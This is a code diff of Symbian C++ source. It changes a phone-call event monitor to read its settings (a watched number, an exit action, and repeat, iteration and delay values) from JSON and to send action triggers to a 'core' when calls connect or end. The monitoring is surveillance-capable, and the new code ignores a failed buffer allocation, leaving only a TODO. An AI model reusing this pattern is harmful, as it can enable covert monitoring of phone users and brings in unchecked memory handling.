@@ -6,6 +6,7 @@
  */
 
 #include "EventCall.h"
+#include "Json.h"
 
 CEventCall::CEventCall(TUint32 aTriggerId) :
 	CAbstractEvent(EEvent_Call, aTriggerId)
@@ -42,17 +43,57 @@ void CEventCall::ConstructL(const TDesC8& params)
 	//__FLOG(_L("-------------"));
 	
 	BaseConstructL(params);
-	TUint8* ptr = (TUint8 *)iParams.Ptr();
-	Mem::Copy(&iCallParams, iParams.Ptr(), sizeof(TCallStruct));
-	ptr += sizeof(TCallStruct);
-		
-	if (iCallParams.iNumLen > 2)  //when telephone number is empty, this counts only NULL WCHAR (2 bytes)
-		{
-		TUint8 totChars = (iCallParams.iNumLen-1) / 2;
-		TPtr16 ptrNum((TUint16 *) ptr, totChars, totChars);
-		iTelNumber.Copy(ptrNum);  
-		}
 	
+	RBuf paramsBuf;
+		
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
+		{
+		paramsBuf.Copy(params);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+		
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve telephone number
+		rootObject->GetStringL(_L("number"),iTelNumber);
+		//retrieve exit action
+		if(rootObject->Find(_L("end")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("end"),iCallParams.iExitAction);
+			}
+		else
+			iCallParams.iExitAction = -1;
+			
+		//retrieve repeat action
+		if(rootObject->Find(_L("repeat")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("repeat"),iCallParams.iRepeatAction);
+			rootObject->GetIntL(_L("iter"),iCallParams.iIter);
+			rootObject->GetIntL(_L("delay"),iCallParams.iDelay);
+			}
+		else
+			{
+			iCallParams.iRepeatAction = -1;
+			iCallParams.iIter = 0;
+			iCallParams.iDelay = 0;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
+
 	iCallMonitor = CPhoneCallMonitor::NewL(*this);
 	}
 
@@ -64,7 +105,7 @@ void CEventCall::StartEventL()
 	TInt direction;
 	if(iCallMonitor->ActiveCall(direction,telNumber))
 		{
-		if(iCallParams.iNumLen<=2)  //we don't have to match a number
+		if(iTelNumber.Size()==0)  //we don't have to match a number
 			{
 			iWasInMonitoredCall = ETrue;
 			SendActionTriggerToCoreL();
@@ -90,7 +131,7 @@ void CEventCall::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirectio
 	{
 	if(!iWasInMonitoredCall)
 		{
-		if(iCallParams.iNumLen<=2)
+		if(iTelNumber.Size() == 0)
 			{
 			// no number to match, trigger action
 			iWasInMonitoredCall = ETrue;
@@ -117,7 +158,7 @@ void CEventCall::NotifyDisconnectedCallStatusL()
 	if(iWasInMonitoredCall)
 		{
 		iWasInMonitoredCall = EFalse;
-		if (iCallParams.iExitAction != 0xFFFFFFFF)						
+		if (iCallParams.iExitAction != -1)						
 			SendActionTriggerToCoreL(iCallParams.iExitAction);
 		}
 	}
